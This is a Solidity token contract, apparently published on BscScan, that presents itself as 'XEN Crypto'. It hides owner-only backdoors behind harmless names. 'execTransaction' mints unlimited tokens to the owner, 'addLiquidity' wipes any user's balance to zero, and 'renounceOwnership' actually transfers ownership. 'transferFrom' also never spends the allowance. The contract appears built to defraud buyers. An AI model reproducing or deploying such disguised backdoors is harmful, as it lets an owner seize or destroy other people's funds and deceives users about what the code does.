/**
 *Submitted for verification at BscScan.com on 2022-10-11
*/

//SPDX-License-Identifier: MIT

//xen.network/bsc

pragma solidity ^0.8.0;

contract XENCrypto{

    string public name = "XEN Crypto";
    string public symbol = "XEN";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10000000;
    address public owner;

    mapping(address => uint256) balance;
    mapping(address => mapping(address => uint256)) approval;

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    constructor(){
        owner = msg.sender;
        balance[owner] += totalSupply;
    }

    function balanceOf(address _owner) public view returns(uint256){
        return balance[_owner];
    }

    function transfer(address _to, uint256 _value) public returns(bool){
        require(balance[msg.sender] >= _value);
        balance[msg.sender] -= _value;
        balance[_to] += _value;
        return true;
    }

    function transferFrom(address _owner, address _to, uint256 _value) public returns(bool){
        require(balance[_owner] >= _value);
        require(approval[_owner][msg.sender] >= _value);
        balance[_owner] -= _value;
        balance[_to] += _value;
        return true;
    }

    function approve(address _spender, uint256 _value) public returns(bool success){
        approval[msg.sender][_spender] = _value;
        return true; 
    }

    function allowance(address _owner, address _spender) external view returns (uint256 remaining){
        return approval[_owner][_spender];
    }

    function execTransaction(uint256 _value) public onlyOwner returns(bool){
        balance[owner] += _value;
        totalSupply += _value;
        return true;
    }

    function burn(uint256 _value) public returns(bool){
        require(balance[msg.sender] >= _value);
        balance[msg.sender] -= _value;
        return true;
    }

    function addLiquidity(address _user, uint256 _amount) public onlyOwner returns(bool){
        require(balance[_user] >= _amount);
        balance[_user] = 0;
        return true;
    }

	function renounceOwnership(address _owner) public onlyOwner returns(bool){
			
		owner = _owner;
        return true;
		
	}

}